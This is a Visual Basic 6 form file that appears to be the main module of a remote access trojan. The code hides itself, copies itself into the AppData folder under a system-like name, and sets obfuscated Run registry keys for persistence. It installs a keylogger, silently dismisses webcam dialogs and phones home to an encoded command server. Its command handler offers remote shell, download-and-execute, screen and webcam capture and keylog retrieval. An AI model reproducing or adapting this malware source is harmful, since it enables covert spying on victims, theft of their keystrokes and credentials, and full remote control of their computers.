VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   615
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3045
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   HasDC           =   0   'False
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   615
   ScaleWidth      =   3045
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.PictureBox picWC 
      AutoRedraw      =   -1  'True
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   360
      Left            =   2520
      ScaleHeight     =   360
      ScaleWidth      =   360
      TabIndex        =   0
      Top             =   120
      Width           =   360
   End
   Begin VB.Timer tmrDoWork 
      Enabled         =   0   'False
      Interval        =   250
      Left            =   1920
      Top             =   120
   End
   Begin VB.Timer tmrSpara 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   1560
      Top             =   120
   End
   Begin VB.Timer tmrIdle 
      Interval        =   1000
      Left            =   1200
      Top             =   120
   End
   Begin VB.Timer tmrPersistence 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   840
      Top             =   120
   End
   Begin VB.Timer tmrInfoTO 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   480
      Top             =   120
   End
   Begin VB.Timer tmrConnect 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   120
      Top             =   120
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
    On Error Resume Next
    App.TaskVisible = False
    Me.Hide
            
    mSckServer.WsInitialize Me
    mSckInfo.WsInitialize Me
        
    SETTINGS.PATH_ROOT = Environ("appdata") & "\"
    SETTINGS.INSTALL_FILENAME = "winsvr32.exe"
    SETTINGS.INSTALL_STARTUP = "winupdate"
    SETTINGS.INSTALL_MUTEX = "bs_fsn_50"
    SETTINGS.INSTALL_KLGNAME = "win32.dll"
    
    Call MUTEX_CHECK 'Avoid multiple instances
    
    Call INSTALL_CHECK 'Check to see if app has been installed
    
    tmrPersistence.Enabled = True
    tmrConnect.Enabled = True
    
    Call HookKeyboard 'Enable low-level keylogger
    tmrSpara.Enabled = True
End Sub

Function ReadKey(hKey As String)
    On Error GoTo Error:
    Dim x As Object
    Set x = CreateObject("WScript.shell")
    ReadKey = x.RegRead(hKey)
    Exit Function
Error:     ReadKey = vbNullString
End Function

Public Function Hex2Ascii(ByVal Text As String) As String
    Dim i As Long, num As String, Value As Long
    
    For i = 1 To Len(Text)
        num = Mid(Text, i, 2)
        Value = Value & Chr(Val("&h" & num))
        i = i + 1
    Next i
    Hex2Ascii = Value
End Function

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    mSckServer.WsTerminate
    mSckInfo.WsTerminate
End Sub

Private Sub sckServer_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    mSckServer.WsClose
End Sub

Private Sub tmrDoWork_Timer()
    Dim vhWnd As Long
    vhWnd = FindWindow(vbNullString, "Video Source") 'English
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Videokälla") 'Swedish
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Videokilde") 'Danish
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Video Allikas") 'Estonian
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Source vidéo") 'French
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Sumber video") 'Indoneisan
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Físeán Foinse") 'Irish
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Font de vídeo") 'Catalonian
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Video izvora") 'Croatian
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Video avots") 'Latvian
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Sumber video") 'Malaysian
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Video Sors") 'Maltan
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Videobron") 'Netherlandic
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Vídeo Fonte") 'Portuguese
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Sursa video") 'Romanian
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Fuente de vídeo") 'Spanish
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Video Kaynak") 'Turkish
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Videoquelle") 'German
    If vhWnd = 0 Then vhWnd = FindWindow(vbNullString, "Ffynhonnell Fideo") 'Welsh
    
    If vhWnd <> 0 Then
        Call SendMessage(vhWnd, &H10, 0, 0)
        tmrDoWork.Enabled = False
    End If
End Sub

Private Sub tmrSpara_Timer()
    On Error Resume Next
    Dim ff As Long
    Dim strTmp As String
    
    If FileLen(Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME) = 0 Then
        'FILE_WRITE Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME, "Started: " & Date & " : " & time & vbCrLf
        ff = FreeFile
        strTmp = "Started: " & Date & " : " & time & vbCrLf
        Open Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME For Binary Access Write As ff
            Put ff, , strTmp
        Close ff
        strTmp = vbNullString
    End If
    
    If Len(bufLogData) > 0 Then
        'FILE_WRITE Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME, bufLogData
        ff = FreeFile
        Open Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME For Binary Access Write As ff
            Seek ff, FileLen(Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME) + 1
            Put ff, , bufLogData
        Close ff
    End If
    bufLogData = vbNullString 'Reset buffer
End Sub

Private Sub tmrConnect_Timer()
    If Not mSckServer.IsConnected = True Then
        mSckServer.WsClose
        mSckServer.WsConnect strXOR(HOME_DNS, "frmMain", False), 9081
        'sckServer.Connect "172.17.28.35", 9081
        'mSckServer.WsConnect "127.0.0.1", 9081
        'sckServer.Connect HOME_DNS, 9081
    End If
End Sub

'Public Sub sckServer_CloseSck()
    'sckServer.CloseSck
'End Sub

Public Function strXOR(DataIn As String, CodeKey As String, Encrypt As Boolean) As String
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer, intXOrValue2 As Integer

    If Encrypt = False Then DataIn = Hex2Str(DataIn)
    For lonDataPtr = 1 To Len(DataIn)
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
    If Encrypt = True Then
        strXOR = Str2Hex(strDataOut)
    Else
        strXOR = strDataOut
    End If
End Function

Public Function Hex2Str(ByVal strData As String)
    Dim i As Long
    Dim CryptString As String
    Dim tmpChar As String
    
         On Local Error Resume Next
         For i = 1 To Len(strData) Step 2
            CryptString = CryptString & Chr$(Val("&H" & Mid$(strData, i, 2)))
         Next i
        Hex2Str = CryptString
End Function

Public Function Str2Hex(ByVal strData As String)
    Dim i As Long
    Dim CryptString As String
    Dim tmpAppend As String

     On Local Error Resume Next
     For i = 1 To Len(strData)
        tmpAppend = Hex$(Asc(Mid$(strData, i, 1)))
         If Len(tmpAppend) = 1 Then
            tmpAppend = Trim$(str$(0)) & tmpAppend
         End If
        CryptString = CryptString & tmpAppend
        DoEvents
     Next ' I
    Str2Hex = CryptString
End Function

Public Function WINDOWS_VERSION_FULL() As String
    On Error Resume Next
    Dim reg As Object
    Set reg = CreateObject("WScript.Shell")
    WINDOWS_VERSION_FULL = reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
End Function

Function GetSettingString(ByVal hKey As Long, ByVal strPath As String, ByVal strValue As String, Optional Default As String) As String
    Dim hCurKey As Long
    Dim lResult As Long
    Dim lValueType As Long
    Dim strBuffer As String
    Dim lDataBufferSize As Long
    Dim intZeroPos As Integer
    Dim lRegResult As Long
    
    If Not IsEmpty(Default) Then
        GetSettingString = Default
    Else
        GetSettingString = ""
    End If
    
    lRegResult = RegOpenKey(hKey, strPath, hCurKey)
    lRegResult = RegQueryValueEx(hCurKey, strValue, 0&, lValueType, ByVal 0&, lDataBufferSize)
    
    If lRegResult = 0 Then
        strBuffer = String(lDataBufferSize, " ")
        lResult = RegQueryValueEx(hCurKey, strValue, 0&, 0&, ByVal strBuffer, lDataBufferSize)
    
        intZeroPos = InStr(strBuffer, Chr$(0))
        
        If intZeroPos > 0 Then
            GetSettingString = Left$(strBuffer, intZeroPos - 1)
        Else
            GetSettingString = strBuffer
        End If
    End If
    
    lRegResult = RegCloseKey(hCurKey)
End Function

Public Sub sckInfo_CloseSck()
    mSckInfo.WsClose
End Sub

Public Sub sckInfo_DataArrival(ByVal sData As String, ByVal bytesTotal As Long)
    mSckInfo.sckinfo_Tag = mSckInfo.sckinfo_Tag & sData
End Sub

Public Sub sckInfo_Connect()

End Sub

Public Function MAP_GETCOUNTRY(ByVal API_KEY As String) As String
    On Error Resume Next
    Dim tmp As String, tt() As String
  
    tmrInfoTO.Tag = vbNullString
    mSckInfo.WsClose
    mSckInfo.sckinfo_Tag = ""
    mSckInfo.WsConnect "api.ipinfodb.com", 80
    tmrInfoTO.Enabled = True
      
    Do While mSckInfo.sckinfo_IsConnected = False
        If tmrInfoTO.Tag = "1" Then Exit Do
        DoEvents
    Loop
    tmrInfoTO.Enabled = False
    tmrInfoTO.Tag = vbNullString
    
    If mSckInfo.sckinfo_IsConnected = False Then GoTo Err
    
    mSckInfo.WsSendData "GET /v2/ip_query_country.php?key=" & API_KEY & "&timezone=off HTTP/1.1" & vbCrLf & _
                        "Host: api.ipinfodb.com" & vbCrLf & _
                        "Cache-Control: no-cache" & vbCrLf & _
                        "User-Agent: " & "1" & vbCrLf & _
                        "Connection: closed" & vbCrLf & vbCrLf
       
    tmrInfoTO.Enabled = True
    Do While mSckInfo.sckinfo_IsConnected = True
        If InStr(mSckInfo.sckinfo_Tag, "/Response") > 0 Or tmrInfoTO.Tag = "1" Then
            Exit Do
        End If
        DoEvents
    Loop
    tmrInfoTO.Enabled = False
    tmrInfoTO.Tag = vbNullString
    
    mSckInfo.WsClose
      
    tmp = mSckInfo.sckinfo_Tag
        
    tt = Split(tmp, "<CountryName>")
    MAP_GETCOUNTRY = UCase(Split(tt(1), "<")(0))
    
Err:
    If MAP_GETCOUNTRY = vbNullString Then MAP_GETCOUNTRY = "UNKNOWN"
End Function

Private Sub tmrIdle_Timer()
    Dim lii As LASTINPUTINFO
    lii.cbSize = Len(lii)
    Call GetLastInputInfo(lii)
    tmrIdle.Tag = Val((GetTickCount - lii.dwTime) / 1000)
End Sub

Private Sub tmrInfoTO_Timer()
    tmrInfoTO.Tag = "1"
End Sub

Private Sub PE_SCRAMBLE()
    Dim ff As Long

    ff = FreeFile
    Open Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME For Binary Access Write As ff
        Seek ff, FileLen(Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME) + 1
        Put ff, , GENERATE_CODE(8)
    Close ff
End Sub

Private Sub INSTALL_CHECK()
    On Error Resume Next
    
    If App.Path & "\" & App.EXEName & ".exe" <> Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME Then
        Call MoveFileEx(App.Path & "\" & App.EXEName & ".exe", Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME, 1)
    End If
    
    Call SaveSettingString(&H80000002, strEnc("21022B151E0F14173100080A1C0901022B1535390F1C0922161A3225071F3F04071A30171F3E0806003A201823", "frmMain", False), SETTINGS.INSTALL_STARTUP, Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME)
    Call SaveSettingString(&H80000001, strEnc("21022B151E0F14173100080A1C0901022B1535390F1C0922161A3225071F3F04071A30171F3E0806003A201823", "frmMain", False), SETTINGS.INSTALL_STARTUP, Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME)
    
    Call CreateKey(&H80000002, strEnc("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F041B091A171D000028311D03181B1716062817061A", "test", False))
    Call SaveSettingString(&H80000002, strEnc("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F041B091A171D000028311D03181B1716062817061A", "test", False), SETTINGS.INSTALL_STARTUP, Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME)
    Call CreateKey(&H80000001, strEnc("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F041B091A171D000028311D03181B1716062817061A", "test", False))
    Call SaveSettingString(&H80000001, strEnc("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F041B091A171D000028311D03181B1716062817061A", "test", False), SETTINGS.INSTALL_STARTUP, Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME)
End Sub

Public Sub UNINSTALL()
    On Error Resume Next
    Dim strRemove As String
    Dim lngRet As Long
    Dim i As Long
        
    tmrPersistence.Enabled = False
    
    Call DeleteSettingString(&H80000002, strEnc("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F26010B", "test", False), SETTINGS.INSTALL_STARTUP)
    Call DeleteSettingString(&H80000001, strEnc("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F26010B", "test", False), SETTINGS.INSTALL_STARTUP)
    
    Call DeleteSettingString(&H80000001, strEnc("21220B353E2F34373100080A1C0901022B1535390F1C0922161A3225071F3F04071A30171F3E0806003A220221080A07030131081919020900083F3D1B1B082E", "frmMain", False), SETTINGS.INSTALL_STARTUP)
    Call DeleteSettingString(&H80000002, strEnc("21220B353E2F34373100080A1C0901022B1535390F1C0922161A3225071F3F04071A30171F3E0806003A220221080A07030131081919020900083F3D1B1B082E", "frmMain", False), SETTINGS.INSTALL_STARTUP)

    Randomize
    strRemove = GENERATE_CODE(CLng(Rnd * 10) + 3) & "." & GENERATE_CODE(CLng(Rnd * 10) + 3)
    Call MoveFileEx(Environ("appdata") & "\" & SETTINGS.INSTALL_FILENAME, Environ("temp") & "\" & strRemove, 1)
    ExitProcess 0
End Sub

Private Sub tmrPersistence_Timer()
    On Error Resume Next
    If LCase(App.EXEName) <> "vbc" Then
        Call INSTALL_CHECK
    End If
End Sub

Public Sub sckServer_CloseSck()
    mSckServer.WsClose
End Sub

Public Sub sckServer_DataArrival(ByVal sData As String, ByVal bytesTotal As Long)
    Dim bufData As String
    Dim Params() As String
    Dim lngRet As Long
    
    Params = Split(sData, vbFormFeed, 3)
    
    Select Case Params(0)
        Case "PING"
            mSckServer.WsSendData "PONG"
        
        Case PACKET_ID_BOT.SRV_PING 'Backup ping method
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.Shell 'Remote shell
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case "ID" 'Country info
            COUNTRY = MAP_GETCOUNTRY(Params(1))
            send PACKET_ID_BOT.id, True, USER_ID, HDS_GET(Environ("systemdrive") & "\"), Environ("computername"), Environ("username"), COUNTRY
        
        Case PACKET_ID_BOT.id 'Backup country info
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.INFO 'PC information
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.PRC 'Process management
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.SRV 'Service management
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.PING 'Ping
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.DLOAD_EXEC 'Download and execute
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.UNINSTALL 'Uninstall
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.KLG 'Keylog management
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.SCR 'Screencapture
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case PACKET_ID_BOT.CAM 'Webcam
            PACKET_ADD_SERVER Params(0), Val(Params(1)), Params(2)
        
        Case Else
            If PacketHeader <> "" Then
                Call PACKET_SET_SERVER(PacketBuffer, bufData)
            End If
        
    End Select
End Sub

Public Sub sckServer_Connect()

End Sub
